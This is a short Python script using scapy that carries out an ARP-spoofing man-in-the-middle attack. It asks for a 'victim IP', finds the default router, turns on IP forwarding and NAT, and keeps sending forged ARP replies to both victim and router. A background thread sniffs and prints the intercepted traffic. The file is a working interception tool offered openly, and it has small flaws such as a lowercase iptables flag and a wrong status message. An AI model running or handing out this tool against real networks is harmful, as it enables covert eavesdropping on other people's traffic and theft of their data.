from scapy.all import *
import os # to find router iP and ip forwarding
import time
import threading # to sniff packets 

def get_mac(IP):
	ether=Ether(dst="ff:ff:ff:ff:ff:ff")
	pkt=ether/ARP(pdst=IP)
	ans=srp(pkt,timeout=2,verbose=0)[0]
	for _,rec in ans:
		return rec.hwsrc
	return None

def spoof(target_IP,spoof_IP):
	target_mac=get_mac(target_IP)
	if target_mac is None:
		print(f"cant finde MAC for {target_IP}")
		exit()
	ether=Ether(dst=target_mac)
        #we want send a response arp packet so use op=2
	arp=ARP(op=2,pdst=target_IP,hwdst=target_mac,psrc=spoof_IP)
	pkt=ether/arp
	sendp(pkt,verbose=0)

def get_router_IP():
	out=os.popen("ip route | grep default").read()
	if out:
		router_IP=out.split()[2]
		return  router_IP
	print("cant find router IP!")
	exit()

def enable_IP_forwarding():
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	print("IP forwarding is enable")
	#enable NAT to forward packets from victim
	os.system("iptables -t nat -a POSTROUTING -o eth0 -j MASQUERADE")

def disable_IP_forwarding():
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("IP forwarding is enable")

def sniff_packets():
	#prn is proccesing function to run per packet received
	sniff(filter="ip",prn=lambda pkt: print(f"{pkt.summary()}"))
# main
enable_IP_forwarding()
victim_IP=input("pleas enter victim IP: ")
router_IP=get_router_IP()
threading.Thread(target=sniff_packets,daemon=True).start();
try:
	while True:
		spoof(victim_IP,router_IP)
		spoof(router_IP,victim_IP)
		print("packet sent")
		time.sleep(2)
except KeyboardInterrupt:
	disable_IP_forwarding()
	print("stopped")

